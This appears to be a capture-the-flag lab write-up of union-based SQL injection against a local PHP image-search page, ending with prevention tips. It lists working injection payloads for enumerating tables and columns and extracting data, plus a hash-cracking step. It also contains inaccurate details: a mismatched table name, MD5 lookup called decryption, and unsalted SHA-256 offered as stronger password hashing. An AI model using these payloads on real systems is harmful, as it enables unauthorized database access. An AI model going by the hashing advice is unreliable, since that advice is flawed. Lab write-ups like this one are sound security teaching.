## where

http://localhost:8080/index.php?page=searchimg


## Explanation

SQL injection vulnerabilities occur when an attacker is able to insert or "inject" a SQL query via the input data from the client to the application. This document details various types of SQL injection attacks, including table name disclosure, boolean-based SQL injection, column name disclosure, and data extraction, highlighting the potential for unauthorized access to or manipulation of database information.


## Queries

### basic example
    1 OR 1=1
example: in backend if there is:
    SELECT * FROM users WHERE id = '1 OR 1=1';
    SELECT * FROM users WHERE id = 1 OR 1=1; (true)
returns everything from the table users

With this we know we can obtain 2 columns


### table names
    1 OR 1=2 UNION SELECT null, table_name FROM information_schema.tables

We'll need the table 'list_images'

### column names
    1 UNION SELECT table_name, column_name FROM information_schema.columns
    or
    1 OR 1=2 UNION SELECT table_name, column_name FROM information_schema.columns

We'll need the columns 'title' and 'comment'

### extract table data
    1 OR 1=2 UNION SELECT title, comment from users
we get:
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?


## Decrypt password
Decrypt '1928e8083cf461a51303633093573c46' with MD5
https://md5decrypt.net/en/

Output = 'albatroz'

Convert to lowercase and encrypt with SHA256

https://10015.io/tools/sha256-encrypt-decrypt


## How to prevent

Parameterized Queries: Use parameterized queries to prevent SQL injection, as they ensure that the input is treated as a data value rather than part of the SQL command.

Input Validation: Implement strict input validation checks to reject suspicious or malformed data.

Use of Prepared Statements: With prepared statements, the SQL query is defined separately from its parameters, minimizing the risk of injection.

Employ Stronger Hashing Algorithms: Replace MD5 with more secure hashing algorithms like SHA-256 to enhance cryptographic security.
